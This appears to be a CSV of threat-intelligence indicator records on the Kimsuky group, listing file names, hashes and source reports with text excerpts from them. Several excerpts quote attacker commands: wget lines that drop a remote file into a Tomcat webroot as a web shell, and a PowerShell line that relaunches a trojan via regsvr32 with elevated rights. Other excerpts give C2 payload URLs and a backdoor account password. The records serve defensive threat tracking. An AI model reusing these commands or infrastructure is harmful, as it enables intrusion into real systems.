1.0.0,actor--kimsuky,artifact--sha256:a6a27dc61c09036b5bccf62958ccfe94d90c05eb7176e2ffcee35eeeec638666,observation--sha256:467d660be1986a5d77b68acc6f13bcbb495e543693b00807e50051d8e1ac7b9d,file-name,n.php,n.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ Temp folder image File, Kakao (Daum) phishing mailer As a result of deactivation and analysis, malicious macros were present. (Analysis data) North Korea's position on the use of nuclear force as seen through the April 25 military parade and When executed, additional malicious code is downloaded and executed, and the structure is the same as ""(Figure 26) Malicious code infection process"" above . [+] Joint security advisory from the National Intelligence Service (NIS) and the German Office for ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:a6a27dc61c09036b5bccf62958ccfe94d90c05eb7176e2ffcee35eeeec638666,observation--sha256:01794652ac07e387492b1f51fa12cabdd232440c9661ea25edacae84f02277c4,file-name,n.php,n.php,candidate,2022-09-30T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 6 HackTool/PHP.Mailer.SC183661 (2022.09.30.03) 08a3e160fd44794347c3d7c01845efad Trojan/Win32.Agent (2018.06.19.00) Trojan/Script.Agent.SC193447 (2023.10.19.00) 526ed4e59c3931374f59b326e8ec2a25 HackTool/Win.RdpScan (2021.08.17.03) HackTool/Win.RdpScan (2021.08.17.03) RdpScan_La_1226.exe cc.exe RdpScan_Ksb04.exe Trojan/Script.Agent.SC193448 (2023.10.19.00) info_sc.txt Dropper/Win.Agent (2023.10.20.00) click.php 23447a412c08aa05d41fb321bb2a085a [KBS Sunday Diagnosis],Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:a6a27dc61c09036b5bccf62958ccfe94d90c05eb7176e2ffcee35eeeec638666,observation--sha256:aa6af3c42b52f8845dcb55a28f4dd9616f965dac599c098ec3a40cd2c174628e,file-name,n.php,n.php,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:52b6460878e39024669680c7205278328cfd09a1bd4f1b6c598446f4cce43530,observation--sha256:5ea6f8018f511229ec7d5e009e70df34c84f9894dd7608c64d8409229269c8d4,file-name,nalchampion-2.0.0.exe,nalchampion-2.0.0.exe,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11:49:15 %SystemDrive%\users\%ASD%\downloads\eternal_bin\dou Note e\domain_x64.dll 11:49:15 Operation Covert Stalker Report emaudittouch-2.1.0.exe 20180222144514 Kimsuky's organization Note Eternal Blue epulsar-1.3.1.exe admin_x64_2003.exe Eternal Blue 20180510094312 diagnosis time blepulsar-1.3.1.exe hxxps://www.boannews.com/media/view.asp?idx=78933 Kimsuky's organization (Table 10) (Recent) Eternal Blue package and malware Eternal Blue hxxps://zdnet.co.kr/view/?no=20170516162743 age\domain_x64,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:93ce184a02d7424730781de52c5a450914b9b9381186586db9a9ee3677257c52,observation--sha256:4e0e74b7b7a29e315f68814f51cfef7710a15d6f17a4da499a275e280123e697,file-name,name.pdf,name.pdf,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--9df172e770726627,kimsuky/Joint_CSA_NK_Using_Social_Engineering_20230531.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,FBI | DOS | NSA| NIS | NPA | MOFA TLP:CLEAR Page 19 of 21 | Product ID: CSA-20230601-1 TLP:CLEAR APPENDIX: ADDITIONAL SPEARPHISHING SAMPLES Sample email communication 10: Sample email communication 11: “This is <name of legitimate journalist> from <legitimate non-U.S. news organization> I’m writing to know your thoughts on North Korea’s future direction after the Beijing Winter Olympics are over. Many believe a recent absence of North Korean provocations is due to Pyongyang’s decision not to hur,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:3aa77184feb2a9e74a560207fb3d57eeba22b32a0fc1cdcaec6256672aa44aa4,observation--sha256:84375848f3f9e57a340d06e51395adb657c0555c6774761971be7b922dc1f353,file-name,nasp.exe,nasp.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"hxxps://www.nirsoft.net/utils/internet_explorer_password.html Dictionary assignment attack on a specific service account advanced_port_scanner_console.exe pspv.exe mspass.exe Scanners that can specify IP bands, specific ports, or port ranges Port scanner for specific ports by setting IP bands for each country Extract account information saved in Outlook, Internet Explorer, MSN Explorer Official site: hxxps://www.nirsoft.net/utils/pspv.html explanation advanced_port_scanner.exe netpass64.exe Oper",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:474af390e9dcf55ed676bd45c974105c58601aedba268e2b974ce28d28c2de80,observation--sha256:d9c319de81c635c1510877cd91727e598e4a6b2b48a6d539b51544aa019fb09e,file-name,netpass64.exe,netpass64.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"hxxps://www.nirsoft.net/utils/internet_explorer_password.html Dictionary assignment attack on a specific service account advanced_port_scanner_console.exe pspv.exe mspass.exe Scanners that can specify IP bands, specific ports, or port ranges Port scanner for specific ports by setting IP bands for each country Extract account information saved in Outlook, Internet Explorer, MSN Explorer Official site: hxxps://www.nirsoft.net/utils/pspv.html explanation advanced_port_scanner.exe netpass64.exe Oper",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:a72030523f984c4740e686b4d70972c9f809546771c85a0e01f5ea50c89bd4b9,observation--sha256:ebc36461cab5e3e5f261e227262cf7e585c99f790abd3c2ad0affde860cb8464,file-name,newlist.jsp,newlist.jsp,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:615366cd82bdbe380fbb9aa90b09702ad5b61c811a717301efbb16691d762815,observation--sha256:b666e731da56357ee191e5af6f78cff0b9364cea42882e971980cd50523c77c5,file-name,nhgames.zip,nhgames.zip,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 33}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○추가로, 해당유형의CHM공격C2서버에서“nhgames.zip” 라는이름의ZIP파일로위장한실행파일이배포된정황을확인했습니다. ○해당파일에대한분석을진행했지만, 의심스러운악성행위는발견되지않았으며, 공격자가제작중인테스트파일로추정하고있습니다. 또한, 공격자가“DarkHorse” 라는사용자이름을사용하는사실을확인할수있었고이번보고서의OperationName 으로명명하게됐습니다. PDB C:\Users\DarkHorse\Documents\Visual Studio2015\Projects\empty\x64\Release\empty.pdb[표4-1] nhgames.zipPDB경로 [그림4-6] nhgames.zip파일 Genians SecurityCenter 32",
1.0.0,actor--kimsuky,artifact--sha256:7e35c7e7e3528f6f6d043f643ee6cfd7a26a1ee4d8b8427c9e8c2378c6e1e7f7,observation--sha256:0dc771812afda000048031e1c1e9e705feeaf0eb9221a42caba606eb71b6634f,file-name,nlbrute1.2.exe,nlbrute1.2.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"hxxps://www.nirsoft.net/utils/internet_explorer_password.html Dictionary assignment attack on a specific service account advanced_port_scanner_console.exe pspv.exe mspass.exe Scanners that can specify IP bands, specific ports, or port ranges Port scanner for specific ports by setting IP bands for each country Extract account information saved in Outlook, Internet Explorer, MSN Explorer Official site: hxxps://www.nirsoft.net/utils/pspv.html explanation advanced_port_scanner.exe netpass64.exe Oper",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:7e35c7e7e3528f6f6d043f643ee6cfd7a26a1ee4d8b8427c9e8c2378c6e1e7f7,observation--sha256:2e6667296a745ef47ac215335598d7c50ff9e4a19326bf7600872fb43023500e,file-name,nlbrute1.2.exe,nlbrute1.2.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Vulnerability scanning is also possible. rdpv.exe (Remote Administration Tool) (Table 5) Exploited public programs Since communication with the internal system is impossible in the usage environment without going through a router, vulnerability scanning is also impossible. Remote management program official site: hxxps://www.ammyy.com/en/ Extract RDP account information remote management program RDP Wrapper explanation Additionally, exploiting publicly available programs can make it difficult fo",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:a465ffd53911f4e805e32d4b85c4f1f739e456fe25eb649d986a79a75424060c,observation--sha256:ee7b3480a875d62d67a2d2415fb536e361a0455e330edfe2bc58af7558ee91a9,file-name,note.php,note.php,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 16}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,- http://seoulhobi[.]biz/how/fmaov0.hta - http://192.186.142[.]74/cache/fwvuj0.hta - http://192.186.142[.]74/cache/expres.php?op=1 - http://192.186.142[.]74/cache/expres.php?op=2 - http://192.186.142[.]74/cache/cow.php?op=exe.gif - http://192.186.142[.]74/cache/cow.php?op=cow.gif - http://192.186.142[.]74/cache/upload.php - http://192.186.142[.]74/mn/xtgnb0.hta - http://192.186.142[.]74/post/Yluhi0.hta - http://192.186.142[.]74/dll/Mylqn0.hta - http://192.186.142[.]74/lib/szgfj0.hta - http://192,
1.0.0,actor--kimsuky,artifact--sha256:24902ceaae3524ee6a3e9c60d27a47ff44bef56e5c6e5f7a6ccd9cd4c0d8b60e,observation--sha256:5d24e70a797dd3725d2d4174349959e2dca112c6561fcbfd5397c6a8e21cecf4,file-name,notouch.php,notouch.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ navernail.eu/ewf43fewfwf4tfw4/wf7weyr892hfwogewgsfg3.php 27.255.80.170(KR) 27.102.114.89(KR) 216.189.149.71(US) ÿ www.ssktool.co.kr/ssktool/20090401skin/chinese/quick/L_quick.php 59.7.91.171(KR) ÿ www.namastte.kr/sources/Util/AJAX.php 211.53.197.220(KR) 27.255.75.137(KR) We contacted the site administrator by email to analyze the cause of the upload, but we did not receive any feedback. Operation Covert Stalker Report 1.243.200.130(KR) 185.176.43.106(BG) 27.102.107.63(KR) 27.255.81.80(KR) 162.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:24902ceaae3524ee6a3e9c60d27a47ff44bef56e5c6e5f7a6ccd9cd4c0d8b60e,observation--sha256:e7510e49620a042bfaf8b1bf144bf75d96847bb5486a2c4695b60023c5340764,file-name,notouch.php,notouch.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 49}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Figure 35) Access log saved at 17*.12*.16*.15* There were 30 files with IPs in the Kakao folder, and as a result of WHOIS search of the 30 IPs, it was confirmed that the United States had the most with 21, followed by China with 4, Korea, Poland with 2 each, and Japan with 1. Considering that most of the hacking targets are domestic North Korea, specific people or organizations engaged in politics, diplomacy, and security, it is surprising that 28 out of 30 IPs are foreign IPs. The results of i",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:24902ceaae3524ee6a3e9c60d27a47ff44bef56e5c6e5f7a6ccd9cd4c0d8b60e,observation--sha256:78253bf592e74e7c6557e20de1939b5d8ed1045f47b8ec5798e72747d6871458,file-name,notouch.php,notouch.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 50}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"assembly.mypressonline.com koreailmin.atwebpages.com/file/notouch.php (Green Dinosaur webshell) Operation Covert Stalker Report (Table 22) C2 and structure of the same pattern koreailmin.mypressonline.com At koreaglobal.mywebcommunity.org, we discovered a malicious document (reimbursement payment form.docx) attached to a hacked email and the North Korean expression “ryondong.” The rule of induction is a phenomenon in which ""ÿ"" or ""ÿ"" is reluctant to appear at the beginning of a word. For example",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:24902ceaae3524ee6a3e9c60d27a47ff44bef56e5c6e5f7a6ccd9cd4c0d8b60e,observation--sha256:fb3c39a5ad233016e4d196a8778693529e366ea5bd9fdb6c1128003f9957dc44,file-name,notouch.php,notouch.php,candidate,2022-04-01T00:00:00Z,month,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 69}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"71 (Table 33) IP mapping record of navernnail.com ?fpath=/srv/disk18/4167496/www/koreaglobal.mypremsedge.exe anel\themes\mobile\images\about\temp/cook Operation Covert Stalker Report 28 The bait document (Summary of the Seo Hee roundtable meeting (draft).hwp) was valid. It was judged to be the Kimsuky organization's IP, not the analyst's IP. 2022.04 ~ 2022.05 18:51:15 59.7.91.171 se/quick/L_quick.php?fpath=/home/ssktool/public_ht 2022.06 ~ 2022.08 21*.16*.25*.5* obtained from the Yahoo folder ca",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:24902ceaae3524ee6a3e9c60d27a47ff44bef56e5c6e5f7a6ccd9cd4c0d8b60e,observation--sha256:ef89e956874bb7ec7ee5d88f098da38630f8d340955af5fc0596bd48d7397e09,file-name,notouch.php,notouch.php,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:f06ac2b465623186660d03037799731928b2418e4e7573cb81963c294693a974,observation--sha256:19beae3c2b3ba0b06a5e8da6910f92f2cb69a4b1dc8d50cf67a54ba9e16efeaf,file-name,obvs7g8.php,obvs7g8.php,candidate,2022-04-01T00:00:00Z,month,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 69}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"71 (Table 33) IP mapping record of navernnail.com ?fpath=/srv/disk18/4167496/www/koreaglobal.mypremsedge.exe anel\themes\mobile\images\about\temp/cook Operation Covert Stalker Report 28 The bait document (Summary of the Seo Hee roundtable meeting (draft).hwp) was valid. It was judged to be the Kimsuky organization's IP, not the analyst's IP. 2022.04 ~ 2022.05 18:51:15 59.7.91.171 se/quick/L_quick.php?fpath=/home/ssktool/public_ht 2022.06 ~ 2022.08 21*.16*.25*.5* obtained from the Yahoo folder ca",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:f10ff1893b7aee1bcaef53ef498382a78676161fa4b34e2b9754896dbc6fb8de,observation--sha256:3a34a1e23a61653b9d4e96dfa7735d3b7c029cfaebec2da7dc155539492228b6,file-name,oma.php,oma.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 65}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"mailid.pnbbio.com/account/logi n.do mailid.gonggandesign.com/accont/login.do At www.scabm.co.kr, there are many files containing the PHP mailer used by the Kimsuky organization to send phishing emails and the system information of the hacked target connected to the phishing destination as ""mode_hacked target's mail ID.txt"" (42 The file was created around December 2022, and based on this, it was determined that the Kimsuky organization had been abusing www.scabm.co.kr as C2 since last year. (See ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:5ad84ffc465cd6b9e5e4849e98f978d051b5667a3bcdd7479e1f6401119f4951,observation--sha256:4bafcafa28e55847209dd3ce151a4304fbe4cd54a5a1cae31dc2682054091353,file-name,p.exe,p.exe,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:cc83d75d2e995a30934669f413c439b30368c1ff20ec9445e31e07ebc54389da,observation--sha256:aaed57c6af9fe0d34a06fedddd1ccbe4aa2398a5ff13f0c92a05aa54f276e593,file-name,passwod.txt.lnk,passwod.txt.lnk,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 79}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Figure 61) Example of files created in the Check folder Trojan/VBS.Kimsuky Trojan/VBS.Akdoor.S2202 Below (Table 46) is the diagnosis made by the antivirus installed by the Kimsuky organization when testing malware in 17*.11*.22*.18*(US). C:\Users\DefaultUser\Downloads\info_sc_org1 - 20230321053830 C:\Users\Administrator\Downloads\passwod.txt.lnk e\16.0\Exported\{015223D7-1E1C-4B92-9ED7- Even if you enter an incorrect parameter value, the file is not deleted. Like list.php, it is determined by t",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:cc83d75d2e995a30934669f413c439b30368c1ff20ec9445e31e07ebc54389da,observation--sha256:b02625cd0b6d2cb201b8682e36b87207b96abe4d05d8fac184180bde74b245ee,file-name,passwod.txt.lnk,passwod.txt.lnk,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 7 HackTool/Win.RdpScan (2021.08.17.03) 64c97f485939ed66b13df5d7880d0757 result.lnk Backdoor/Win.AppleSeed (2022.06.22.01) 9b5add63dc12bc6c7028c6abf08c6ffd 6b3235a4c55aba4f6ffbf6f86f9c31e6 Dropper/LNK.Kimsuky.S2172 (2023.03.22.00) first (2).txt 74f1f1ba400ab3a0882927f81e3ea62e d.php Infostealer/Script.Agent (2023.10.19.01) shadow.exe Malware/PS.Generic.SC180735 (2023.10.18.01) viso.exe 7175e046767725b2f8d93f8a69a9999f 71f8ac92adf5af2357594446e85db30a Trojan/VBS.Kim,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:cc83d75d2e995a30934669f413c439b30368c1ff20ec9445e31e07ebc54389da,observation--sha256:ab383ecd4289e544fd1f4164301550e86b13728f7681f139d66c311d7bbe48d3,file-name,passwod.txt.lnk,passwod.txt.lnk,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 80}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Table 46) Antivirus diagnostic log of 17*.11*.22*.18*(US) hxxps://asec.ahnlab.com/ko/49843/ First, the word 'exection' in the FILE PATH of ms_x64.dll, shown in light red, is a typo that originally meant execution, and the Kimsuky organization has established the continuity of the connection with 17*.11*.22*.18*(US). To secure it, it can be interpreted as running ms_x64.dll to create an account (DefaultUser / lsjdoif#@$@#09v921) and creating and running %System%\termsvc.dll, which is RDPWraper. ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:e2c68f7f5f3a91cf8b70221fd038d100dcac9b415e3c003a6e48e64268a14b9c,observation--sha256:1edbac732909164add56d173685beeff9974564667d1c03ecf97d6e1b36493ff,file-name,pay.exe,pay.exe,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 6}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,"微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[5] . 向系统目录拷贝 如果复制成功将会直接执行，否则会检查 speed3.exe 路径是否包含 Low 字符串，如果 不包含，则会复制到 C:\Users\<user>\AppData\Local\comhost.exe 执行，并以字符串""Level Medium-->Path""作为日志标识。 如 果 包 含 Low 字 符 串 ， 则 会 利 用 漏 洞 CVE_2019_0880 进 行 提 权 ， 将%Temp%\speed1.dll 通过注入的方式以高权限执行。 图[6] . 漏洞 CVE_2019_0880 expolit 反汇编代码片段 被 注 入 执 行 的 speed1.dll ， 从 Temp 目 录 寻 找 %Temp%\low\pay.exe 或 者 %Temp%\pay.exe （ 间 谍 模 块 ） ， 将 其 复 制 到 C:\Users\<user>\AppData\Local\comhost.exe 并执行。",
1.0.0,actor--kimsuky,artifact--sha256:40603f4c04f0f06edf0d9ea8b4ac0fa15e888d3ff4de5b3c6bad9d8c98b3e45d,observation--sha256:5278074346516d81896bd11d774519c12a2fbbef0172843b23b46ee60e85a60b,file-name,post.php,post.php,candidate,2022-05-13T00:00:00Z,day,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 57}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.11. C2도메인유사도 ○C2 도메인에서도유사도를확인할수있으며, VBS 1 / JSE 1 유형의도메인은작년5월안랩에서공개한Kimsuky보고서 의C2도메인과유사한형태가사용됐었습니다. 10 ○JSE 1 유형부터는C2 도메인형태에변화가있었고이후유형들은기존의Kimsuky도메인유형과는달라졌으며, 점차단순화되는형태를띄고있습니다. [표4-5] C2도메인유사도 10 Ahnlab- 다양한주제의보도자료를사칭한Kimsuky공격시도 Genians SecurityCenter 56 유형 날짜 C2Domain Kimsuky 2022-05-13 mc[.]pzs.kr/themes/mobile/images/about/temp/upload/list.php?query=1 VBS1 2022-02-09 sktelecom[.]help/download/select.php?type=12022-03-15 encorpost[.]com/post/post.php?type=12022-0",
1.0.0,actor--kimsuky,artifact--sha256:d7eeb0adb0f0a41176cb676e461ab33a4ff2dc8defb9a04dd98c4b230bc803fd,observation--sha256:6d4d67dbf93e86dfe45f7baab04d19537c386cfb5b780a20a2d22d049f64aa86,file-name,powershell.exe,powershell.exe,candidate,2021-11-02T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 71}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,"(2) certuser.info In the table below (Table 36), hxxp://bipaf.org is the C2 through which the malicious document (MD5: 90a56bc6a66bb4e02265389529757460) communicates, and namastte has been hacked by the Kimsuky organization since November 2021, before April 2022, which was recognized by AhnLab. Abuse with C2 (Table 36) Malicious behavior log of 21*.16*.25*.5*(KR) A total of 45 malicious URLs with similar patterns were mapped to 21*.9*.1*.16*(KR) where certuser.info was mapped. 71 22*.15*.24*.13*",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:d7eeb0adb0f0a41176cb676e461ab33a4ff2dc8defb9a04dd98c4b230bc803fd,observation--sha256:380ba9abe2b599f1a210e1a1f00613d9637e3222d74364875b6361e5f85b0c41,file-name,powershell.exe,powershell.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 8}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[11].RAT 模块中设置注册表开机启动项 接着以“SpyRegsvr32-20210507140631”为名创建互斥体，此种类型互斥体在 Kims uky 之前的攻击活动中多次出现，其中有“Spy”关键字和编译时间信息“20210507”。 图[12].RAT 模块中创建互斥体 通过检查 UAC 注册表项 ConsentPromptBehaviorAdmin 和 PromptOnSecureDesktop 来确定 UAC 是否关闭，以及是否为管理员模式，如果否的话将会调用 powershell 提权运行。 powershell.exe start-process regsvr32.exe -argumentlist '/s [木马路径]' -verb runas 木马使用两层命令结构与 C2 服务器通信，使用的 C2 服务器为：anto.shore.ml。 ?m={指令 1}&p1={硬盘序列号}&p2={指令 2} 该模块可支持多种间谍类型的远控功能，包括远程 Shell、文件上传/下载,Actor-directory corpus sweep; ambiguous values remain candidates.
